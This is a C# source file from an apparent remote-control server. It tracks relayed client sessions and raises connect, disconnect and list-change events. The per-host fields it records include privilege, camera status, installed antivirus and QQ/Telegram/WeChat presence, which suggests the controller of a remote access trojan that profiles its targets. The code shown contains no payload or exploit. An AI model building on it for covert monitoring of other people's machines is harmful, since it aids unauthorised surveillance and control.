using System;
using System.Collections.Generic;
using System.Linq;
using RemoteControl.Protocals;
using RemoteControl.Protocals.Relay;

namespace RemoteControl.Server
{
    partial class RemoteControlServer
    {
        private void ApplyClientListResponse(RelayClientListResponse resp)
        {
            if (resp == null || resp.Clients == null)
                return;

            var added = new List<SocketSession>();
            var removed = new List<SocketSession>();
            var updated = new List<SocketSession>();
            var incomingIds = new HashSet<string>();

            lock (_virtualClientsLock)
            {
                foreach (RelayClientInfo info in resp.Clients)
                {
                    if (info == null || string.IsNullOrEmpty(info.ClientId))
                        continue;

                    incomingIds.Add(info.ClientId);
                    SocketSession session;
                    if (_virtualClients.TryGetValue(info.ClientId, out session))
                    {
                        if (UpdateVirtualSession(session, info))
                            updated.Add(session);
                    }
                    else
                    {
                        session = CreateVirtualSession(info);
                        _virtualClients[info.ClientId] = session;
                        added.Add(session);
                    }
                }

                foreach (string clientId in _virtualClients.Keys.ToList())
                {
                    if (!incomingIds.Contains(clientId))
                    {
                        SocketSession session = _virtualClients[clientId];
                        _virtualClients.Remove(clientId);
                        removed.Add(session);
                    }
                }
            }

            RaiseClientListChanged(added, removed, updated);
        }

        private void ApplyClientOnline(RelayClientOnline online)
        {
            if (online == null || string.IsNullOrEmpty(online.ClientId))
                return;

            SocketSession session = null;
            bool added = false;
            bool updated = false;
            lock (_virtualClientsLock)
            {
                var info = new RelayClientInfo
                {
                    ClientId = online.ClientId,
                    HostName = online.HostName,
                    IP = online.IP,
                    AppPath = online.AppPath,
                    OnlineAvatar = online.OnlineAvatar,
                    OnlineTime = online.OnlineTime,
                    UserName = online.UserName,
                    LocalIP = online.LocalIP,
                    OSVersion = online.OSVersion,
                    Privilege = online.Privilege,
                    CameraStatus = online.CameraStatus,
                    Antivirus = online.Antivirus,
                    OnlineQQ = online.OnlineQQ,
                    TG = online.TG,
                    WX = online.WX,
                    UserStatus = online.UserStatus,
                    Region = online.Region,
                    ISP = online.ISP
                };

                if (_virtualClients.TryGetValue(online.ClientId, out session))
                {
                    updated = UpdateVirtualSession(session, info);
                }
                else
                {
                    session = CreateVirtualSession(info);
                    _virtualClients[online.ClientId] = session;
                    added = true;
                }
            }

            if (added)
                RaiseClientConnected(session);
            else if (updated)
                RaiseClientListChanged(null, null, new List<SocketSession> { session });
        }

        private void ApplyClientOffline(RelayClientOffline offline)
        {
            if (offline == null || string.IsNullOrEmpty(offline.ClientId))
                return;

            SocketSession session = null;
            lock (_virtualClientsLock)
            {
                if (_virtualClients.ContainsKey(offline.ClientId))
                {
                    session = _virtualClients[offline.ClientId];
                    _virtualClients.Remove(offline.ClientId);
                }
            }

            if (session != null)
                RaiseClientDisconnected(session);
        }

        private SocketSession CreateVirtualSession(RelayClientInfo info)
        {
            var session = new SocketSession(info.ClientId, _relaySocket);
            session.SendHandler = SendVirtualClientPacket;
            UpdateVirtualSession(session, info);
            return session;
        }

        private static bool UpdateVirtualSession(SocketSession session, RelayClientInfo info)
        {
            string hostName = !string.IsNullOrEmpty(info.HostName) ? info.HostName : info.IP;
            bool changed =
                !StringEquals(session.HostName, hostName) ||
                !StringEquals(session.GetExternalIP(), info.IP) ||
                !StringEquals(session.AppPath, info.AppPath) ||
                !StringEquals(session.OnlineAvatar, info.OnlineAvatar) ||
                !StringEquals(session.UserName, info.UserName) ||
                !StringEquals(session.LocalIP, info.LocalIP) ||
                !StringEquals(session.OSVersion, info.OSVersion) ||
                !StringEquals(session.Privilege, info.Privilege) ||
                !StringEquals(session.CameraStatus, info.CameraStatus) ||
                !StringEquals(session.Antivirus, info.Antivirus) ||
                !StringEquals(session.OnlineQQ, info.OnlineQQ) ||
                !StringEquals(session.TG, info.TG) ||
                !StringEquals(session.WX, info.WX) ||
                !StringEquals(session.UserStatus, info.UserStatus) ||
                !StringEquals(session.Region, info.Region) ||
                !StringEquals(session.ISP, info.ISP);

            session.SetHostName(hostName);
            session.SetExternalIP(info.IP);
            session.SetAppPath(info.AppPath);
            session.SetOnlineAvatar(info.OnlineAvatar);
            session.SetClientInfo(info.UserName, info.LocalIP, info.OSVersion, info.Privilege, info.CameraStatus);
            session.SetBossExInfo(info.Antivirus, info.OnlineQQ, info.TG, info.WX, info.UserStatus, info.Region, info.ISP);
            session.Touch();
            return changed;
        }

        private static bool StringEquals(string left, string right)
        {
            return string.Equals(left ?? string.Empty, right ?? string.Empty, StringComparison.Ordinal);
        }

        private void RaiseClientConnected(SocketSession session)
        {
            try
            {
                if (ClientConnected != null)
                    ClientConnected(this, new ClientConnectedEventArgs(session));
            }
            catch (Exception ex)
            {
                Console.WriteLine("ClientConnected事件异常: " + ex.Message);
            }
        }

        private void RaiseClientDisconnected(SocketSession session)
        {
            try
            {
                if (ClientDisconnected != null)
                    ClientDisconnected(this, new ClientConnectedEventArgs(session));
            }
            catch (Exception ex)
            {
                Console.WriteLine("ClientDisconnected事件异常: " + ex.Message);
            }
        }

        private void RaiseClientListChanged(List<SocketSession> added, List<SocketSession> removed, List<SocketSession> updated)
        {
            if ((added == null || added.Count == 0) &&
                (removed == null || removed.Count == 0) &&
                (updated == null || updated.Count == 0))
                return;

            try
            {
                if (ClientListChanged != null)
                    ClientListChanged(this, new ClientListChangedEventArgs(added, removed, updated));
            }
            catch (Exception ex)
            {
                Console.WriteLine("ClientListChanged事件异常: " + ex.Message);
            }
        }
    }
}
